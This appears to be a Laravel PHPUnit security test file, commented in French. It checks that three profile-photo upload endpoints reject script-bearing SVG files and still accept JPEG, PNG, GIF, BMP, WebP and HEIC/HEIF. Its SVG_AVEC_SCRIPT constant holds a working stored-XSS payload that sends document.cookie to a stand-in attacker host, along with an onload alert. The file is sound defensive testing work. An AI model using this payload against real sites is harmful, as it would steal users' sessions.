<?php

namespace Tests\Feature\Security;

use App\Livewire\Provider\Onboarding\ProviderOnboardingWizard;
use App\Models\ProviderProfile;
use App\Models\User;
use App\Support\Validation\ImagesTeleversees;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Str;
use Laravel\Sanctum\Sanctum;
use Livewire\Features\SupportFileUploads\FileUploadConfiguration;
use Livewire\Livewire;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * M-4 — un SVG déposé comme photo de profil est un document XML qui peut porter du script.
 *
 * TROIS points d'entrée écrivent une image sur le disque `public`, c'est-à-dire dans un dossier
 * servi tel quel par le serveur web, sur le domaine de l'application :
 *
 *   - POST /api/client/profile/avatar        → ClientProfileController::uploadAvatar()
 *   - POST /api/provider/onboarding/profile  → ProviderOnboardingController::setProfile()
 *   - ProviderOnboardingWizard::saveStep0()  → le MÊME dossier que le précédent, depuis le web
 *
 * Un fichier rendu avec `Content-Type: image/svg+xml` s'exécute dans l'origine de l'application.
 * L'administrateur qui ouvre le dossier d'un prestataire y laisserait donc sa session.
 *
 * CE QUE CE FICHIER VERROUILLE, ET DANS LES DEUX SENS :
 *
 *   1. le SVG est refusé aux TROIS points — durcir deux portes sur trois ne ferme rien ;
 *   2. TOUS les formats matriciels de {@see ImagesTeleversees} passent encore, aux trois points —
 *      un durcissement qui refuse un gif de vieux téléphone n'est pas un correctif, c'est une
 *      panne. C'est exactement ce qui était arrivé : l'API mobile refusait gif et bmp que le
 *      wizard web acceptait.
 *
 * ATTENTION AU FAUX POSITIF DE MESURE : `UploadedFile::fake()->create('x.svg', 1, 'image/svg+xml')`
 * ne prouve rien ici. `Illuminate\Http\Testing\File::getMimeType()` REND LE TYPE DÉCLARÉ au lieu de
 * l'inspecter — le test mesurerait alors une étiquette qu'il a lui-même posée. Même piège côté
 * Livewire : `Testable::set()` encode le type dans le nom du fichier temporaire, et
 * `TemporaryUploadedFile::getMimeType()` le relit tel quel sous PHPUnit. Les fichiers de ce test
 * portent donc de VRAIS octets, écrits sur le disque sans marqueur `-mimeType=`, et traversent
 * `finfo` comme en production.
 */
class UploadImageSvgXssTest extends TestCase
{
    use RefreshDatabase;

    /** SVG valide portant une charge active : c'est l'attaque. */
    private const SVG_AVEC_SCRIPT = <<<'SVG'
        <?xml version="1.0" encoding="UTF-8"?>
        <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
          <script type="text/javascript">fetch('https://attaquant.example/vol?c='+document.cookie)</script>
          <circle cx="50" cy="50" r="40" fill="red" onload="alert(document.domain)"/>
        </svg>
        SVG;

    /**
     * Un vrai fichier 1×1 par format accepté, encodé en dur : l'extension GD n'est pas chargée sur
     * ce poste, on ne peut donc pas les générer.
     *
     * La clé est l'extension envoyée, la valeur porte les octets et l'extension SOUS LAQUELLE le
     * fichier sera rangé — `hashName()` reprend `guessExtension()`, pas le nom du client, donc un
     * `.jpeg` atterrit en `.jpg`.
     *
     * @return array<string, array{0: string, 1: string, 2: string}>
     */
    public static function formatsAcceptes(): array
    {
        $jpeg = '/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0a'
            .'HBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/wAALCAABAAEBAREA/8QAFAABAAAAAAAA'
            .'AAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAD8AKp//2Q==';

        return [
            'jpg' => ['jpg', $jpeg, 'jpg'],
            'jpeg' => ['jpeg', $jpeg, 'jpg'],
            'png' => ['png', 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'png'],
            'gif' => ['gif', 'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'gif'],
            'bmp' => ['bmp', 'Qk1GAAAAAAAAADYAAAAoAAAAAQAAAAEAAAABABgAAAAAABAAAADDDgAAww4AAAAAAAAAAAAA////AA==', 'bmp'],
            'webp' => ['webp', 'UklGRhoAAABXRUJQVlA4TA0AAAAvAAAAEAcQERGIiP4HAA==', 'webp'],

            /*
             * LE HEIC ET LE HEIF SONT DEUX ENTREES DISTINCTES, ET LES DEUX PORTENT.
             *
             * Ce sont des boites ISOBMFF : `finfo` lit la MARQUE declaree dans l'en-tete `ftyp`, pas
             * l'extension. Une photo d'iPhone se presente en marque `heic` et rend `image/heic` ;
             * d'autres appareils ecrivent la marque generique `mif1`, qui rend `image/heif`. Les
             * deux types se traduisent en DEUX extensions differentes -- n'en lister qu'une
             * refuserait la moitie du parc, et le refus tomberait sur des appareils qu'on n'a pas
             * sous la main pour le reproduire.
             *
             * Les octets ci-dessous sont de vrais en-tetes `ftyp` de 24 octets, pas des chaines
             * baptisees : c'est `finfo` qui doit les reconnaitre, comme en production.
             */
            'heic' => ['heic', 'AAAAGGZ0eXBoZWljAAAAAGhlaWNtaWYx', 'heic'],
            'heif' => ['heif', 'AAAAGGZ0eXBtaWYxAAAAAG1pZjFoZWlj', 'heif'],
        ];
    }

    private string $dossierTemporaire;

    protected function setUp(): void
    {
        parent::setUp();

        Storage::fake('public');

        $this->dossierTemporaire = sys_get_temp_dir().'/cx-upload-'.Str::random(12);
        mkdir($this->dossierTemporaire, 0777, true);
    }

    protected function tearDown(): void
    {
        foreach (glob($this->dossierTemporaire.'/*') ?: [] as $fichier) {
            @unlink($fichier);
        }
        @rmdir($this->dossierTemporaire);

        parent::tearDown();
    }

    // ---------------------------------------------------------------------
    // Fabrication des charges — de vrais octets, jamais d'étiquette déclarée
    // ---------------------------------------------------------------------

    /**
     * Construit un vrai fichier téléversé à partir d'octets réels.
     *
     * `test: true` court-circuite `is_uploaded_file()`, faux hors requête HTTP réelle ; le reste
     * du chemin (détection du type par `finfo`, `guessExtension()`) est celui de production.
     */
    private function televerse(string $nom, string $contenu, string $typeDeclare): UploadedFile
    {
        $chemin = $this->dossierTemporaire.'/'.$nom;
        file_put_contents($chemin, $contenu);

        return new UploadedFile($chemin, $nom, $typeDeclare, null, true);
    }

    private function svgDAttaque(string $nom = 'avatar.svg'): UploadedFile
    {
        return $this->televerse($nom, self::SVG_AVEC_SCRIPT, 'image/svg+xml');
    }

    private function imageReelle(string $extension, string $base64): UploadedFile
    {
        return $this->televerse('photo.'.$extension, (string) base64_decode($base64, true), 'image/'.$extension);
    }

    private function pngLegitime(string $nom = 'avatar.png'): UploadedFile
    {
        return $this->televerse(
            $nom,
            (string) base64_decode(self::formatsAcceptes()['png'][1], true),
            'image/png',
        );
    }

    /**
     * Dépose des octets dans le tampon de Livewire et rend le nom de fichier temporaire.
     *
     * C'est la voie de production : le navigateur envoie le fichier à la route d'upload de
     * Livewire, puis appelle `_finishUpload` avec le nom obtenu. On passe volontairement à côté de
     * `Testable::set()`, qui encode le type MIME dans le nom du fichier — `getMimeType()` le
     * relirait alors au lieu d'inspecter le contenu, et le test mesurerait sa propre étiquette.
     */
    private function deposeDansLeTamponLivewire(string $nomOrigine, string $contenu): string
    {
        $nom = Str::random(30)
            .'-meta'.str_replace('/', '_', base64_encode($nomOrigine)).'-'
            .'.'.pathinfo($nomOrigine, PATHINFO_EXTENSION);

        FileUploadConfiguration::storage()->put(FileUploadConfiguration::path($nom), $contenu);

        return $nom;
    }

    // ---------------------------------------------------------------------
    // 1. Le vecteur d'attaque, aux TROIS points d'entrée
    // ---------------------------------------------------------------------

    public function test_l_avatar_client_refuse_un_svg_porteur_de_script(): void
    {
        $client = User::factory()->create(['role' => 'client']);
        Sanctum::actingAs($client);

        $reponse = $this->post(
            '/api/client/profile/avatar',
            ['avatar' => $this->svgDAttaque()],
            ['Accept' => 'application/json'],
        );

        $reponse->assertStatus(422)->assertJsonValidationErrors('avatar');

        // Le refus doit être total : rien n'atteint le disque public, rien n'est référencé.
        $this->assertNull($client->fresh()->profile_photo_path);
        $this->assertSame([], Storage::disk('public')->allFiles());
    }

    public function test_l_api_d_onboarding_prestataire_refuse_un_svg_porteur_de_script(): void
    {
        $prestataire = User::factory()->employe()->create();
        Sanctum::actingAs($prestataire);

        $reponse = $this->post(
            '/api/provider/onboarding/profile',
            ['name' => 'Jean Dupont', 'photo' => $this->svgDAttaque('photo.svg')],
            ['Accept' => 'application/json'],
        );

        $reponse->assertStatus(422)->assertJsonValidationErrors('photo');

        $this->assertSame([], Storage::disk('public')->allFiles());
        $this->assertDatabaseMissing('provider_profiles', ['user_id' => $prestataire->id]);
    }

    /**
     * La troisième porte, celle qu'on avait oubliée : le wizard web écrit sur le même disque public
     * que l'API mobile ci-dessus. Tant qu'elle acceptait ce que l'autre refusait, le durcissement
     * n'était qu'un déplacement du problème.
     */
    public function test_le_wizard_web_d_onboarding_refuse_un_svg_porteur_de_script(): void
    {
        $prestataire = User::factory()->employe()->create();
        $this->actingAs($prestataire);

        $tampon = $this->deposeDansLeTamponLivewire('photo.svg', self::SVG_AVEC_SCRIPT);

        Livewire::test(ProviderOnboardingWizard::class)
            ->call('_finishUpload', 'photo', [$tampon], false)
            ->set('name', 'Jean Dupont')
            ->call('saveStep0')
            ->assertHasErrors('photo')
            ->assertSet('currentStep', 0);

        $this->assertSame(
            [],
            Storage::disk('public')->allFiles(),
            'Le wizard web a laissé un fichier sur le disque public alors que la validation devait le refuser.',
        );
    }

    /**
     * Le nom de fichier ne doit pas servir de porte dérobée : renommer la charge en `.png` ne change
     * rien, puisque la validation lit le contenu et non l'extension annoncée.
     */
    public function test_un_svg_deguise_en_png_est_refuse_lui_aussi(): void
    {
        $client = User::factory()->create(['role' => 'client']);
        Sanctum::actingAs($client);

        $this->post(
            '/api/client/profile/avatar',
            ['avatar' => $this->televerse('innocent.png', self::SVG_AVEC_SCRIPT, 'image/png')],
            ['Accept' => 'application/json'],
        )->assertStatus(422)->assertJsonValidationErrors('avatar');

        $this->assertSame([], Storage::disk('public')->allFiles());
    }

    public function test_le_wizard_web_refuse_aussi_un_svg_deguise_en_png(): void
    {
        $this->actingAs(User::factory()->employe()->create());

        $tampon = $this->deposeDansLeTamponLivewire('innocent.png', self::SVG_AVEC_SCRIPT);

        Livewire::test(ProviderOnboardingWizard::class)
            ->call('_finishUpload', 'photo', [$tampon], false)
            ->set('name', 'Jean Dupont')
            ->call('saveStep0')
            ->assertHasErrors('photo');

        $this->assertSame([], Storage::disk('public')->allFiles());
    }

    // ---------------------------------------------------------------------
    // 2. Le chemin normal, aux TROIS points d'entrée
    // ---------------------------------------------------------------------

    /**
     * Un fichier légitime de CHAQUE format accepté doit encore passer. gif et bmp sont dans la
     * liste à dessein : ce ne sont pas des vecteurs de script, mais ce que produisent encore de
     * vieux téléphones et de vieux scanners — le parc même des prestataires qu'on veut inscrire.
     */
    #[DataProvider('formatsAcceptes')]
    public function test_l_avatar_client_accepte_chaque_format_de_la_liste(string $extension, string $base64, string $extensionRangee): void
    {
        $client = User::factory()->create(['role' => 'client']);
        Sanctum::actingAs($client);

        $this->post(
            '/api/client/profile/avatar',
            ['avatar' => $this->imageReelle($extension, $base64)],
            ['Accept' => 'application/json'],
        )->assertOk()->assertJsonPath('ok', true);

        $chemin = $client->fresh()->profile_photo_path;

        $this->assertNotNull($chemin, "Un fichier .{$extension} légitime a été refusé par l'avatar client.");
        $this->assertStringEndsWith('.'.$extensionRangee, $chemin);
        Storage::disk('public')->assertExists($chemin);
    }

    #[DataProvider('formatsAcceptes')]
    public function test_l_api_d_onboarding_accepte_chaque_format_de_la_liste(string $extension, string $base64, string $extensionRangee): void
    {
        $prestataire = User::factory()->employe()->create();
        Sanctum::actingAs($prestataire);

        $reponse = $this->post(
            '/api/provider/onboarding/profile',
            ['name' => 'Jean Dupont', 'photo' => $this->imageReelle($extension, $base64)],
            ['Accept' => 'application/json'],
        );

        $reponse->assertOk()->assertJsonPath('ok', true);

        $chemin = (string) $reponse->json('photo_path');

        $this->assertStringEndsWith(
            '.'.$extensionRangee,
            $chemin,
            "Un fichier .{$extension} légitime a été refusé par l'API d'onboarding.",
        );
        Storage::disk('public')->assertExists($chemin);
    }

    /**
     * Le même jeu de formats côté web. C'est l'assertion de PARITÉ : si l'un des deux parcours
     * cesse de lire {@see ImagesTeleversees}, l'un des six cas tombe ici ou dans le test ci-dessus.
     */
    #[DataProvider('formatsAcceptes')]
    public function test_le_wizard_web_accepte_chaque_format_de_la_liste(string $extension, string $base64, string $extensionRangee): void
    {
        $prestataire = User::factory()->employe()->create();
        $this->actingAs($prestataire);

        $tampon = $this->deposeDansLeTamponLivewire(
            'photo.'.$extension,
            (string) base64_decode($base64, true),
        );

        Livewire::test(ProviderOnboardingWizard::class)
            ->call('_finishUpload', 'photo', [$tampon], false)
            ->set('name', 'Jean Dupont')
            ->call('saveStep0')
            ->assertHasNoErrors()
            ->assertSet('currentStep', 1);

        $chemin = (string) ProviderProfile::where('user_id', $prestataire->id)->first()?->photo_path;

        $this->assertStringEndsWith(
            '.'.$extensionRangee,
            $chemin,
            "Un fichier .{$extension} légitime a été refusé par le wizard web.",
        );
        Storage::disk('public')->assertExists($chemin);
    }

    /**
     * La photo reste facultative des deux côtés : l'étape 0 sert aussi à saisir un nom seul.
     */
    public function test_l_onboarding_accepte_toujours_une_etape_sans_photo(): void
    {
        $prestataire = User::factory()->employe()->create();
        Sanctum::actingAs($prestataire);

        $this->postJson('/api/provider/onboarding/profile', ['name' => 'Jean Dupont'])
            ->assertOk()
            ->assertJsonPath('ok', true);

        $this->assertSame('Jean Dupont', $prestataire->fresh()->name);
    }

    public function test_le_wizard_web_accepte_toujours_une_etape_sans_photo(): void
    {
        $prestataire = User::factory()->employe()->create();
        $this->actingAs($prestataire);

        Livewire::test(ProviderOnboardingWizard::class)
            ->set('name', 'Jean Dupont')
            ->set('photo', null)
            ->call('saveStep0')
            ->assertHasNoErrors()
            ->assertSet('currentStep', 1);
    }

    // ---------------------------------------------------------------------
    // 3. Sentinelle sur le reste du dépôt
    // ---------------------------------------------------------------------

    /**
     * Les trois points doivent lire la MÊME liste, et cette parité-là ne se voit pas en boîte
     * noire aujourd'hui : sur Laravel 12.62 `image` vaut exactement notre liste (jpg, jpeg, png,
     * gif, bmp, webp). Un wizard resté sur `image` se comporterait donc comme les deux autres —
     * jusqu'à la montée de version qui les fera diverger, en silence.
     *
     * D'où un contrôle sur la SOURCE, seul endroit où la divergence est visible avant qu'elle ne
     * coûte quelque chose. Ce dépôt a déjà payé ce prix deux fois : les tables d'alias mobiles et
     * le garde-fou couleur décrivaient la même chose à trois endroits sans jamais se vérifier.
     *
     * Les règles `mimes:pdf,jpg,jpeg,png` des étapes 1 et 3 ne sont pas concernées : ce sont des
     * JUSTIFICATIFS, qui admettent le PDF et partent sur le disque `private`.
     */
    public function test_les_trois_points_lisent_la_meme_liste(): void
    {
        $fichiers = [
            'app/Http/Controllers/Api/Client/ClientProfileController.php',
            'app/Http/Controllers/Api/Provider/ProviderOnboardingController.php',
            'app/Livewire/Provider/Onboarding/ProviderOnboardingWizard.php',
        ];

        /*
         * TOUS LES POINTS DE TELEVERSEMENT FAUTIFS D'UN COUP.
         *
         * Les trois photos de profil visent le MEME disque public : des que l'une d'elles porte sa
         * propre liste, c'est la plus permissive des trois qui definit la surface d'attaque. Savoir
         * qu'une seule a decroche ne dit donc rien de la surface reelle — c'est la liste entiere
         * qu'il faut lire.
         *
         * On accumule des LIBELLES et non le fichier entier : `assertStringContainsString` aurait
         * deverse tout le source dans le rapport, noyant le message qui dit quoi faire.
         */
        $fautifs = [];

        foreach ($fichiers as $fichier) {
            $source = (string) file_get_contents(base_path($fichier));

            if (! str_contains($source, 'ImagesTeleversees::regles(')) {
                $fautifs[] = "{$fichier} : n appelle plus la liste partagee";
            }

            if (str_contains($source, "'image'")) {
                $fautifs[] = "{$fichier} : revenu a la regle `image` de Laravel, dont la definition "
                    .'vit dans vendor/ et peut accueillir le svg a la prochaine montee de version';
            }
        }

        $this->assertSame([], $fautifs, 'Ces points de televersement echappent a la liste partagee.');
    }

    /**
     * Neuf autres points de téléversement du dépôt valident encore avec la règle `image` nue
     * (MissionFieldActionController ×2, MissionExecutionBoard ×2, MesRendezVous ×2, LitigesClient,
     * AiQuotePhoto, AiQuoteController). Sur Laravel 12.62 cette règle REFUSE déjà le svg —
     * `validateImage()` ne l'ajoute que sur le paramètre explicite `allow_svg` — et c'est la seule
     * raison pour laquelle ces neuf points ne sont pas des trous ouverts.
     *
     * Cette garantie n'est écrite nulle part chez nous : elle tient à une ligne de `vendor/`. Si une
     * montée de version la reprend, ce test tombe et désigne l'ensemble des appelants restants avant
     * qu'une charge active n'atteigne le disque public.
     */
    public function test_la_regle_image_nue_de_laravel_refuse_encore_le_svg(): void
    {
        $validateur = Validator::make(
            ['fichier' => $this->svgDAttaque('sentinelle.svg')],
            ['fichier' => ['image']],
        );

        $this->assertTrue(
            $validateur->fails(),
            'La règle `image` de Laravel accepte désormais le svg : les points de téléversement du '.
            "dépôt qui l'utilisent encore sont devenus des XSS stockés — ceux qui écrivent sur le ".
            'disque `private` restent servis par un contrôleur, ceux qui écrivent sur `public` sont '.
            'exploitables directement. Basculer chacun sur ImagesTeleversees::regles(), comme les '.
            'trois photos de profil.',
        );
    }

    /**
     * Le pendant du test précédent : notre liste ne doit rien REFUSER que `image` accepte, sans
     * quoi on casse des téléversements légitimes sans rien fermer. Le svg est le seul RETRAIT ;
     * les ajouts, eux, sont permis mais doivent être déclarés.
     */
    public function test_notre_liste_couvre_image_sans_le_svg(): void
    {
        /*
         * ON VERROUILLE LE RAISONNEMENT, PAS LA VALEUR DU JOUR.
         *
         * Ce test comparait la liste a un tableau litteral. Il refusait donc aussi les ajouts
         * VOLONTAIRES, alors que son propre intitule ne garde que contre le RETRAIT : « notre liste
         * ne doit rien REFUSER que `image` accepte ». Un instantane fige la valeur ; ce qu'on veut
         * figer, c'est la regle.
         *
         * Deux clauses, donc. Tout ce que Laravel appelle image reste accepte -- et le svg mis a
         * part, c'est la clause qui empeche de casser des televersements legitimes. Et rien
         * d'autre n'entre sans figurer dans la liste des ajouts assumes : une addition distraite
         * echoue toujours.
         */
        $natifs = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'];

        $disparus = array_values(array_diff($natifs, ImagesTeleversees::EXTENSIONS));

        $this->assertSame(
            [],
            $disparus,
            'Ces formats ont disparu de la liste partagee. Refuser un format matriciel legitime ne '
            .'ferme aucune faille : ca empeche juste un prestataire de s inscrire.',
        );

        /*
         * LES AJOUTS ASSUMES, et le motif de chacun.
         *
         * `heic`/`heif` : format par defaut de l'appareil photo des iPhone depuis iOS 11, que la
         * regle `image` de Laravel ne connait pas. Sans eux, un client qui photographie son
         * logement avec un iPhone recoit « format non accepte ». Ce sont des conteneurs matriciels
         * ISOBMFF : ils ne portent ni script ni gestionnaire d'evenement, contrairement au svg.
         */
        $ajoutsAssumes = ['heic', 'heif'];

        $this->assertSame(
            [],
            array_values(array_diff(ImagesTeleversees::EXTENSIONS, $natifs, $ajoutsAssumes)),
            'Un format est entre dans la liste partagee sans etre declare ici. Chaque ajout doit '
            .'etre un conteneur matriciel -- pas un document capable de porter un script -- et '
            .'doit etre reconnu par `finfo`, sans quoi la regle accepte sur le papier et refuse en '
            .'pratique.',
        );

        $this->assertNotContains(
            'svg',
            ImagesTeleversees::EXTENSIONS,
            'Le svg est de retour dans la liste : un document XML porteur de script atterrirait '.
            'sur le disque public, servi sur notre domaine.',
        );
    }
}
